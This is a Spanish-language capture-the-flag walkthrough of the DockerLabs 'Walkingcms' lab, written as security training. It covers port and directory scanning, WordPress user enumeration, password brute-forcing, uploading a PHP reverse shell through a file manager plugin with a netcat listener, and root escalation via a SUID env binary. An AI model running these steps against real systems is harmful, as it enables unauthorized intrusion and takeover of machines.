---
title: Walkingcms - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | El Pingüino de Mario        | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/77dd604e-5f54-4f49-88d9-895340426162)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `80` (HTTP)
A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.
```bash
nmap -p80 -sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/75e7bf0e-7097-4921-b52b-9ec1ed2d04fa)

# Exploración Web
Al analizar el puerto `80`, encontramos la página por defecto de Apache.

![image](https://github.com/user-attachments/assets/c43ac784-f5dd-4088-b5a9-5570e59d20d1)

Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

![image](https://github.com/user-attachments/assets/3aeea9c2-a7b0-441b-ad88-37f2e78fc97d)

Identificamos la ruta `/wordpress`.

# Wordpress

Utilizamos `wpscan` para investigar vulnerabilidades y usuarios en el sitio de **WordPress**:
```bash
wpscan --url http://172.17.0.2/wordpress -e 
```
![image](https://github.com/user-attachments/assets/6523fb18-311e-40ae-b49b-eae65ac1cd09)

Descubrimos al usuario `mario`, y procedimos a realizar fuerza bruta para acceder con su cuenta.

## Fuerza bruta.
Usamos la herramienta `wpscan` con el diccionario `rockyou.txt` para intentar descubrir la contraseña:
```bash
wpscan --url http://172.17.0.2/wordpress -U mario -P /usr/share/wordlists/rockyou.txt
```
Encontramos que la contraseña de `mario` es `love`.

![image](https://github.com/user-attachments/assets/d3ebd0d3-b0d9-4bfb-b631-bcf668240a65)

Al acceder con `mario`, observamos que tiene privilegios de administrador, lo cual nos permite añadir el plugin `FILE MANAGER` para cargar un archivo `shell.php` y acceder mediante una **reverse shell**.

## Reverse Shell

Creamos un archivo `shell.php` cargado con una reverse shell usando la herramienta de [Reverseshell de Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

![image](https://github.com/user-attachments/assets/f8cd26c8-08bb-459d-b45b-5f761626f3e1)

Una vez subido, accedemos a la ruta `/wordpress/shell.php` para ejecutar la shell.

Simultáneamente, iniciamos `netcat` en nuestro sistema para escuchar conexiones entrantes:

```bash 
nc -lvnp 4444
```
Al acceder a la reverse shell desde el navegador, logramos obtener acceso como `www-data`.

![image](https://github.com/user-attachments/assets/4456d8d6-70d2-4f81-9684-0e5685581680)

Logramos acceso como` www-data`.

![image](https://github.com/user-attachments/assets/f06c2d36-dd9d-498e-bba4-20fb4e8df2e3)

## TTY ReverseShell

### Iniciar una sesión de shell interactiva
En nuestra shell básica, ejecutamos el siguiente comando para forzar la creación de una sesión de bash interactiva:
```bash
script /dev/null -c bash
```
### Suspender la shell
Una vez que el comando anterior está en ejecución, utilizamos
```bash
Control+Z
```
para suspender temporalmente nuestra shell.

### Preparar nuestro terminal local:
Antes de volver a nuestra shell, configuramos nuestro terminal local:
```bash
stty raw -echo; fg
```

### Resetear la configuración del terminal
Ahora que tenemos el control de la shell, la reseteamos para asegurar que se comporta correctamente:
```bash
reset
```

### Configura el tipo de terminal:
```bash
xterm
export TERM=xterm
export SHELL=bash
```

# Escalada de Privilegios

Ejecutamos el siguiente comando para encontrar archivos con permisos `SUID`, que pueden ayudar en la escalada de privilegios:
```bash
find / -perm -4000 2>/dev/null
```
Descubrimos que podemos ejecutar el comando `env` con permisos de root, lo cual aprovechamos de la siguiente manera:
```bash
/usr/bin/env /bin/sh -p
```
Ahora, hemos escalado privilegios a `root`.

![image](https://github.com/user-attachments/assets/46fca506-c321-431e-8c4a-50f1c08fac4a)
